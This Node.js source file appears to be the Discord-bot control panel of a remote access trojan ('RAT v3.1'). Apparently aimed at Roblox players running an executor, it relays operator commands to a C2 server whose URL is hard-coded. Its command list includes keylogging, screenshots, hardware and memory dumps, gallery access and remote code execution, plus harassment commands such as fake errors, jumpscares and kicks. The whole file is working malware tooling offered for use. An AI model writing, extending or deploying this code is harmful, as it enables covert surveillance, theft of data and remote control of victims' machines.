const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const fetch = require('node-fetch');
const express = require('express');

// ========== КОНФИГУРАЦИЯ ==========
const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
const SERVER_URL = process.env.SERVER_URL || "https://ratserver-6wo3.onrender.com";
const PORT = process.env.PORT || 3000;

console.log('🚀 Запуск RAT Discord Bot v3.1...');
console.log(`🌐 Сервер: ${SERVER_URL}`);
console.log(`🔑 Токен: ${DISCORD_TOKEN ? '✅ Установлен' : '❌ Отсутствует'}`);

if (!DISCORD_TOKEN) {
    console.error('❌ ОШИБКА: DISCORD_TOKEN не найден в переменных окружения!');
    console.log('💡 Добавь в Railway Variables:');
    console.log('DISCORD_TOKEN = твой_токен_бота');
    process.exit(1);
}

// ========== СОЗДАНИЕ КЛИЕНТА ==========
const client = new Client({ 
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ] 
});

// ========== HTTP СЕРВЕР ДЛЯ ПРОВЕРКИ ==========
const app = express();

app.get('/', (req, res) => {
    res.json({
        status: 'online',
        bot: client.user ? {
            username: client.user.tag,
            ready: client.isReady(),
            uptime: client.uptime
        } : { ready: false },
        server: SERVER_URL,
        timestamp: new Date().toISOString(),
        version: '3.1.0'
    });
});

app.get('/health', (req, res) => {
    res.send('OK');
});

// ========== ФУНКЦИИ ==========
async function sendCommand(command, args = [], target = null) {
    try {
        const payload = { command, args };
        if (target) payload.target = target;
        
        console.log(`📨 Отправка: ${command} для ${target || 'всех игроков'}`);
        
        const response = await fetch(`${SERVER_URL}/command`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        
        if (!response.ok) {
            console.error(`❌ Сервер вернул ошибку: ${response.status}`);
            return false;
        }
        
        console.log(`✅ Команда отправлена успешно`);
        return true;
    } catch (error) {
        console.error(`❌ Ошибка отправки:`, error.message);
        return false;
    }
}

async function getOnlineUsers() {
    try {
        const response = await fetch(`${SERVER_URL}/users`);
        return await response.json();
    } catch (error) {
        console.error('❌ Ошибка получения пользователей:', error.message);
        return { users: [], count: 0 };
    }
}

async function getServerStatus() {
    try {
        const response = await fetch(`${SERVER_URL}/status`);
        return await response.json();
    } catch (error) {
        console.error('❌ Ошибка получения статуса:', error.message);
        return null;
    }
}

// ========== ОБРАБОТКА КОМАНД ==========
client.on('ready', () => {
    console.log('\n' + '='.repeat(50));
    console.log(`✅ БОТ УСПЕШНО ЗАПУЩЕН!`);
    console.log(`🤖 Имя: ${client.user.tag}`);
    console.log(`🆔 ID: ${client.user.id}`);
    console.log(`👥 Серверов: ${client.guilds.cache.size}`);
    console.log(`🌐 Railway URL: ${process.env.RAILWAY_STATIC_URL || 'Не установлен'}`);
    console.log('='.repeat(50));
    console.log('\n📝 Доступные команды:');
    console.log('• /test - Проверка связи');
    console.log('• /users - Онлайн игроки');
    console.log('• /status - Статус системы');
    console.log('• /help - Все команды');
    console.log('• /kick [игрок] <причина> - Кикнуть игрока');
    console.log('• /freeze [игрок] <секунды> - Заморозить');
    console.log('• /cameralock [игрок] <on/off> - Блокировка камеры');
    console.log('• /jumpscare [игрок] <тип> - Скример');
    console.log('\n⚡ Бот готов к работе!');
    
    client.user.setActivity('/help | RAT v3.1', { type: 'PLAYING' });
});

client.on('messageCreate', async message => {
    // Игнорируем сообщения от ботов
    if (message.author.bot) return;
    
    // Проверяем что сообщение начинается с /
    if (!message.content.startsWith('/')) return;
    
    console.log(`\n💬 Команда от ${message.author.tag}: ${message.content}`);
    
    // Убираем / и разбиваем на части
    const args = message.content.slice(1).split(' ');
    const command = args.shift().toLowerCase();
    
    // Проверяем есть ли таргет
    let target = null;
    const firstArg = args[0];
    
    // Простая проверка на ник (3-20 символов, буквы/цифры/_)
    if (firstArg && /^[a-zA-Z0-9_]{3,20}$/.test(firstArg)) {
        target = args.shift();
    }
    
    try {
        // 🎯 ОСНОВНЫЕ КОМАНДЫ
        if (command === 'test') {
            if (await sendCommand("popup", ["✅ Тест от Discord бота!"], target)) {
                await message.reply(`✅ Тест отправлен ${target ? `игроку **${target}**` : '**всем игрокам**'}!`);
            } else {
                await message.reply('❌ Ошибка отправки теста. Проверьте сервер.');
            }
        }
        
        else if (command === 'users') {
            const data = await getOnlineUsers();
            
            const embed = new EmbedBuilder()
                .setTitle('👥 Онлайн игроки')
                .setColor(0x00ff00);
            
            if (data.count > 0) {
                embed.setDescription(`**Всего онлайн:** ${data.count}`);
                
                const userList = data.users.slice(0, 15).map(u => 
                    `• **${u.player}** - ${u.place || 'Unknown'} (${u.executor || 'Unknown'})`
                ).join('\n');
                
                embed.addFields({
                    name: 'Список игроков:',
                    value: userList + (data.users.length > 15 ? `\n\n... и еще ${data.users.length - 15} игроков` : '')
                });
            } else {
                embed.setDescription('❌ Нет активных игроков');
                embed.setColor(0xff0000);
            }
            
            await message.reply({ embeds: [embed] });
        }
        
        else if (command === 'status') {
            const data = await getServerStatus();
            
            if (!data) {
                await message.reply('❌ Не удалось получить статус сервера');
                return;
            }
            
            const embed = new EmbedBuilder()
                .setTitle('📊 Статус системы RAT v3.1')
                .setColor(0x7289da)
                .addFields(
                    { name: '🌐 Сервер API', value: data.status === 'online' ? '🟢 Онлайн' : '🔴 Офлайн', inline: true },
                    { name: '👥 Онлайн игроков', value: `\`${data.online_users || 0}\``, inline: true },
                    { name: '📨 Очередь команд', value: `\`${data.pending_commands || 0}\``, inline: true },
                    { name: '📊 Версия', value: '`3.1.0`', inline: true },
                    { name: '🔗 Ссылка', value: `[Открыть](${SERVER_URL})`, inline: true }
                );
            
            await message.reply({ embeds: [embed] });
        }
        
        else if (command === 'help') {
            const embed = new EmbedBuilder()
                .setTitle('🤖 RAT Control Panel v3.1')
                .setDescription('**Формат:** `/команда [игрок] <аргументы>`\n**Пример:** `/freeze PlayerName 10`')
                .setColor(0x7289da)
                .addFields(
                    { 
                        name: '🎯 Основные команды', 
                        value: '`/test` - проверка связи\n`/users` - онлайн игроки\n`/status` - статус системы\n`/help` - эта справка' 
                    },
                    { 
                        name: '👤 Управление игроком', 
                        value: '`/kick [ник] <причина>`\n`/freeze [ник] <секунды>`\n`/void [ник]`\n`/spin [ник]`\n`/fling [ник]`' 
                    },
                    { 
                        name: '📷 Камерные команды', 
                        value: '`/cameralock [ник] <on/off>`\n`/camerashake [ник] <сек> <сила>`' 
                    },
                    { 
                        name: '👻 Скримеры', 
                        value: '`/jumpscare [ник] <тип>`\n**Типы:** 1=Джефф Килер, 2=Соник.exe' 
                    },
                    { 
                        name: '🔊 Аудио/Видео', 
                        value: '`/mute [ник]`\n`/unmute [ник]`\n`/playaudio [ник] <id>`\n`/blur [ник] <сек>`' 
                    },
                    { 
                        name: '💬 Чат', 
                        value: '`/chat [ник]`\n`/message [ник] <текст>`' 
                    }
                )
                .setFooter({ text: `Всего команд: 27 | Сервер: ${SERVER_URL}` });
            
            await message.reply({ embeds: [embed] });
        }
        
        // 🎯 ВСЕ ОСТАЛЬНЫЕ КОМАНДЫ
        else {
            const validCommands = [
                'kick', 'freeze', 'void', 'spin', 'fling', 'sit', 'dance',
                'mute', 'unmute', 'playaudio', 'blur', 'chat', 'message',
                'jumpscare', 'cameralock', 'camerashake', 'execute', 'fakeerror',
                'keylog', 'stopkeylog', 'hardware', 'hide', 'memory', 'gallery',
                'screenshot', 'print'
            ];
            
            if (validCommands.includes(command)) {
                console.log(`⚡ Отправка команды: ${command}, аргументы: ${args}, цель: ${target}`);
                
                if (await sendCommand(command, args, target)) {
                    await message.reply(`✅ Команда \`${command}\` отправлена ${target ? `игроку **${target}**` : '**всем игрокам**'}`);
                } else {
                    await message.reply('❌ Ошибка отправки команды. Проверьте подключение к серверу.');
                }
            } else {
                await message.reply(`❌ Неизвестная команда \`${command}\`. Используйте \`/help\` для списка команд.`);
            }
        }
    } catch (error) {
        console.error('❌ Ошибка обработки команды:', error);
        await message.reply('❌ Внутренняя ошибка бота');
    }
});

// ========== ЗАПУСК ПРИЛОЖЕНИЯ ==========
async function start() {
    try {
        // Запускаем HTTP сервер
        app.listen(PORT, () => {
            console.log(`🌐 HTTP сервер запущен на порту ${PORT}`);
            console.log(`🔗 Health check доступен по: http://localhost:${PORT}/`);
            console.log(`📡 Railway URL: ${process.env.RAILWAY_STATIC_URL || 'Будет доступен после деплоя'}`);
        });
        
        // Запускаем Discord бота
        await client.login(DISCORD_TOKEN);
        
        console.log('\n✨ ВСЁ ГОТОВО! Бот запущен успешно!');
        console.log('📡 Бот будет онлайн 24/7 на Railway');
        
    } catch (error) {
        console.error('❌ ФАТАЛЬНАЯ ОШИБКА ЗАПУСКА:', error.message);
        console.error('💡 Проверь:');
        console.error('1. Правильный ли Discord токен');
        console.error('2. Включены ли интенты в настройках бота');
        console.error('3. Добавлен ли бот на сервер Discord');
        process.exit(1);
    }
}

// Запускаем приложение
start();

// Обработка ошибок
process.on('uncaughtException', (err) => {
    console.error('❌ Необработанное исключение:', err);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('❌ Необработанный промис:', reason);
});
